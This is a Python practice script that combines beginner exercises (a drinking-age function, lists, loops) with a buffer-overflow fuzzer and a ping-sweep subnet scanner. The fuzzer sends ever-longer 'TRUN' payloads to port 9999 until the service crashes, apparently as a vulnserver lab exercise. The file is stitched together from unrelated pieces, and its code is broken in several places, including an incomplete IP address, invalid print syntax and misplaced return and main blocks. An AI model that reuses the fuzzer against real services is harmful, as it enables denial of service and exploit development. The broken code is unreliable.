import socket
import sys
import argparse
import re
import datetime
import subprocess
from time import sleep


def alcohol(age, money):
    if (age >= 21) and (money >= 5):
        return "we're getting smashed."
    elif(age >= 21) and (money < 5):
        return "No money to buy."
    elif (age < 21) and (money >= 5):
        return "Nice try, underaged dude."
    else:
        return "You're too poor and young for this."


print(alcohol(21, 4))
print(alcohol(20, 4))

print('\n')

# Lists
print("Lists have brackets:")

movies = ["When Harry met Sally", "The Hangover",
          "The Perks of Being a Wallflower", "The Exorcist"]

print(movies[0])
print(movies[0:2])

# You can append
movies.append("Jaws")

# or splice/delete them
movies.pop()

# Combine them

movies = ["When Harry Met Sally", "The Hangover",
          "The Perks of being a Wallflower", "The Exorcist"]
person = ["Heath", "Jake", "Leah", "Jeff"]
combined = zip(movies, person)
print(list(combined))
# Looping
print("For loops- start to finish of iterate:")

vegetables = ["cucumber", "spinach", "cabbage"]

for x in vegetables:
    print(x)

print("While loops - execute as long as True:")
i = 1
while i < 10:
    print(i)
    i += 1

# buffer overflow

#!/usr/bin/python

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1", 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print: "Fuzzing crashed at %s bytes"


def write_result(filename, ping):
    with open(filename, "w") as f:
        f.write(f"Start time {datetime.datetime.now()}")
        for result in ping:
            f.write(result)
        f.write(f"End time {datetime.datetime.now()}")


def ping_subnet(subnet):
    for addr in range(1, 255):
        yield subprocess.Popen(["ping", f"{subnet}.{addr}", "-n", "1"], stdout=subprocess.PIPE) \
                        .stdout.read()                                                          \
                        .decode()


def main(subnet, filename):
    write_result(filename, ping_subnet(subnet))


def parse_arguments():
    parser = argparse.ArgumentParser(usage='%(prog)s [options] <subnet>',
                                     description='ip checker',
                                     epilog="python ipscanner.py 192.168.1 -f somefile.txt")
    parser.add_argument('subnet', type=str, help='the subnet you want to ping')
    parser.add_argument('-f', '--filename', type=str, help='The filename')
    args = parser.parse_args()

    if not re.match(r"(\d{1,3}\.\d{1,3}\.\d{1,3})", args.subnet) \
            or any(a not in range(1, 255)for a in map(int, args.subnet.split("."))):
        parser.error("This is not a valid subnet")

    if " " in args.filename:
        parser.error("There cannot be whitespaces in the filename")

        return args.subnet, args.filename
    if __name__ == '__main__':
        main(*parse_arguments())
